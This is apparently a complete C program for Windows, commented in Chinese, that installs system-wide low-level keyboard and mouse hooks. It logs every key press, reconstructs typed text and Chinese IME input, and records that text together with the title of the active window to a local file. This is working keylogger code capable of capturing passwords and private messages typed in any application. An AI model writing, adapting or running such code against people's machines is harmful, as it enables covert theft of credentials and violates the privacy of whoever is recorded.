#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <imm.h>          // IME 相关 API
#pragma comment(lib, "imm32.lib")

// 全局日志文件指针
FILE* g_logFile = NULL;

// 鼠标节流时间（毫秒）
const DWORD MOUSE_THROTTLE_MS = 500;
DWORD g_lastMouseMoveTime = 0;
DWORD g_lastWheelTime = 0;

// 键盘输入缓冲区（用于记录连续输入）
#define INPUT_BUFFER_SIZE 1024
char g_inputBuffer[INPUT_BUFFER_SIZE] = { 0 };
int g_bufferPos = 0;

// 获取当前活动窗口标题
void GetActiveWindowTitle(char* title, size_t size) {
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        GetWindowTextA(hwnd, title, (int)size);
    }
    else {
        strcpy_s(title, size, "无窗口");
    }
}

// 获取当前焦点窗口的 IME 组合字符串（如果正在组合中）
BOOL GetImeCompositionString(char* outStr, size_t outSize) {
    HWND hwnd = GetForegroundWindow();
    HIMC hIMC = ImmGetContext(hwnd);
    if (!hIMC) return FALSE;

    // 获取组合字符串长度（以字节为单位）
    DWORD len = ImmGetCompositionStringA(hIMC, GCS_COMPSTR, NULL, 0);
    if (len > 0 && len < outSize) {
        ImmGetCompositionStringA(hIMC, GCS_COMPSTR, outStr, len);
        outStr[len] = '\0';
        ImmReleaseContext(hwnd, hIMC);
        return TRUE;
    }
    ImmReleaseContext(hwnd, hIMC);
    return FALSE;
}


// 获取时间字符串
void GetTimeString(char* buffer, size_t size) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    sprintf_s(buffer, size, "%04d-%02d-%02d %02d:%02d:%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}

// 记录一段文本（输入缓冲区或 IME 字符串）
void RecordInputText(const char* text, const char* windowTitle) {
    char timeStr[64];
    GetTimeString(timeStr, sizeof(timeStr));
    fprintf(g_logFile, "%s 输入 %s (%s)\n", timeStr, windowTitle, text);
    fflush(g_logFile);
}

// 清空输入缓冲区
void ClearInputBuffer() {
    g_bufferPos = 0;
    g_inputBuffer[0] = '\0';
}

// 向缓冲区添加一个字符
void AppendToBuffer(char ch) {
    if (g_bufferPos < INPUT_BUFFER_SIZE - 1) {
        g_inputBuffer[g_bufferPos++] = ch;
        g_inputBuffer[g_bufferPos] = '\0';
    }
}

// 删除缓冲区最后一个字符
void BackspaceBuffer() {
    if (g_bufferPos > 0) {
        g_inputBuffer[--g_bufferPos] = '\0';
    }
}


// 获取时间戳字符串（用于默认文件名）
void GetTimestampString(char* buffer, size_t size) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    sprintf_s(buffer, size, "%04d%02d%02d%02d%02d%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}

// 将虚拟键码转换为可读名称或字符
const char* GetKeyName(DWORD vkCode) {
    static char buffer[32];
    switch (vkCode) {
    case VK_RETURN:     return "Enter";
    case VK_BACK:       return "Backspace";
    case VK_TAB:        return "Tab";
    case VK_ESCAPE:     return "Esc";
    case VK_SPACE:      return "Space";
    case VK_DELETE:     return "Delete";
    case VK_INSERT:     return "Insert";
    case VK_HOME:       return "Home";
    case VK_END:        return "End";
    case VK_PRIOR:      return "PageUp";
    case VK_NEXT:       return "PageDown";
    case VK_LEFT:       return "Left";
    case VK_UP:         return "Up";
    case VK_RIGHT:      return "Right";
    case VK_DOWN:       return "Down";
    case VK_CAPITAL:    return "CapsLock";
    case VK_NUMLOCK:    return "NumLock";
    case VK_SCROLL:     return "ScrollLock";
    case VK_SNAPSHOT:   return "PrintScreen";
    case VK_PAUSE:      return "Pause";
    case VK_LSHIFT:     return "Left Shift";
    case VK_RSHIFT:     return "Right Shift";
    case VK_LCONTROL:   return "Left Ctrl";
    case VK_RCONTROL:   return "Right Ctrl";
    case VK_LMENU:      return "Left Alt";
    case VK_RMENU:      return "Right Alt";
    case VK_LWIN:       return "Left Win";
    case VK_RWIN:       return "Right Win";
    }

    // 可打印字符转换
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    WORD ch[2];
    int ret = ToAscii(vkCode, scanCode, keyboardState, ch, 0);
    if (ret > 0) {
        char c = (char)ch[0];
        if (c >= 32 && c <= 126) {
            sprintf_s(buffer, sizeof(buffer), "'%c'", c);
            return buffer;
        }
        else {
            sprintf_s(buffer, sizeof(buffer), "字符:0x%02X", (unsigned char)c);
            return buffer;
        }
    }
    else if (ret == -1) {
        return "死键";
    }
    sprintf_s(buffer, sizeof(buffer), "键码:%u", vkCode);
    return buffer;
}

// 键盘钩子（增强版：支持输入缓存和 IME 捕获）
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) return CallNextHookEx(NULL, nCode, wParam, lParam);

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = ks->vkCode;
        const char* keyName = GetKeyName(vkCode);

        // 处理输入缓冲区逻辑
        BOOL isPrintable = (vkCode >= 'A' && vkCode <= 'Z') ||
            (vkCode >= '0' && vkCode <= '9') ||
            vkCode == VK_SPACE ||
            vkCode == VK_OEM_PERIOD || vkCode == VK_OEM_COMMA ||
            (vkCode >= VK_OEM_1 && vkCode <= VK_OEM_3) ||
            (vkCode >= VK_OEM_4 && vkCode <= VK_OEM_8);

        // 如果按下的是可打印字符（包括空格），添加到缓冲区
        if (isPrintable) {
            // 获取实际字符（可能受 Shift 影响）
            char ch[2] = { 0 };
            BYTE ksState[256];
            GetKeyboardState(ksState);
            UINT scan = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
            WORD wTrans[2];
            if (ToAscii(vkCode, scan, ksState, wTrans, 0) == 1) {
                ch[0] = (char)wTrans[0];
                AppendToBuffer(ch[0]);
            }
            else {
                // 某些特殊符号可能无法转换，直接添加键名
                AppendToBuffer('?');
            }
        }
        // 按下 Backspace：删除缓冲区最后一个字符
        else if (vkCode == VK_BACK) {
            BackspaceBuffer();
        }
        // 按下 Enter 或 Space（作为输入确认）时，记录缓冲区内容
        else if (vkCode == VK_RETURN || vkCode == VK_SPACE) {
            // 先尝试获取 IME 组合字符串（中文输入法确认时的最终文字）
            char imeStr[256] = { 0 };
            char windowTitle[256] = { 0 };
            GetActiveWindowTitle(windowTitle, sizeof(windowTitle));
            if (GetImeCompositionString(imeStr, sizeof(imeStr)) && imeStr[0] != '\0') {
                // 有 IME 组合字符串，记录它（中文）
                RecordInputText(imeStr, windowTitle);
                // 清空输入缓冲区（因为已经确认，不再需要拼音缓存）
                ClearInputBuffer();
            }
            else if (g_bufferPos > 0) {
                // 没有 IME 字符串，记录缓冲区内容（可能是英文或拼音）
                RecordInputText(g_inputBuffer, windowTitle);
                ClearInputBuffer();
            }
        }

        // 记录原始按键（可选，便于调试）
        char timeStr[64];
        GetTimeString(timeStr, sizeof(timeStr));
        fprintf(g_logFile, "%s 键盘 %s\n", timeStr, keyName);
        fflush(g_logFile);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// 鼠标钩子（与之前相同，略）
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) return CallNextHookEx(NULL, nCode, wParam, lParam);

    MSLLHOOKSTRUCT* msll = (MSLLHOOKSTRUCT*)lParam;
    POINT pt = msll->pt;
    char action[64] = { 0 };
    DWORD now = GetTickCount();

    switch (wParam) {
    case WM_LBUTTONDOWN: strcpy_s(action, "左键按下"); break;
    case WM_LBUTTONUP:   strcpy_s(action, "左键抬起"); break;
    case WM_RBUTTONDOWN: strcpy_s(action, "右键按下"); break;
    case WM_RBUTTONUP:   strcpy_s(action, "右键抬起"); break;
    case WM_MBUTTONDOWN: strcpy_s(action, "中键按下"); break;
    case WM_MBUTTONUP:   strcpy_s(action, "中键抬起"); break;
    case WM_MOUSEWHEEL: {
        if (now - g_lastWheelTime >= MOUSE_THROTTLE_MS) {
            g_lastWheelTime = now;
            int delta = (short)HIWORD(msll->mouseData);
            sprintf_s(action, sizeof(action), "滚轮滚动 (%+d)", delta);
        }
        else {
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
        break;
    }
    case WM_MOUSEMOVE: {
        if (now - g_lastMouseMoveTime >= MOUSE_THROTTLE_MS) {
            g_lastMouseMoveTime = now;
            strcpy_s(action, "移动");
        }
        else {
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
        break;
    }
    default:
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    if (action[0]) {
        char timeStr[64];
        GetTimeString(timeStr, sizeof(timeStr));
        fprintf(g_logFile, "%s 鼠标 (%d, %d) %s\n", timeStr, pt.x, pt.y, action);
        fflush(g_logFile);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(int argc, char* argv[]) {
    char logFileName[MAX_PATH] = { 0 };

    if (argc == 2) {
        strcpy_s(logFileName, sizeof(logFileName), argv[1]);
    }
    else if (argc == 1) {
        char timeStamp[32];
        GetTimestampString(timeStamp, sizeof(timeStamp));
        sprintf_s(logFileName, sizeof(logFileName), "keymouse_log_%s.txt", timeStamp);
    }

    g_logFile = fopen(logFileName, "a");
    if (!g_logFile) {
        printf("无法创建日志文件: %s\n", logFileName);
        return 1;
    }

    HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    HHOOK hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
    if (!hKeyboardHook || !hMouseHook) {
        printf("钩子安装失败！\n");
        if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
        if (hMouseHook) UnhookWindowsHookEx(hMouseHook);
        fclose(g_logFile);
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);
    UnhookWindowsHookEx(hMouseHook);
    fclose(g_logFile);
    return 0;
}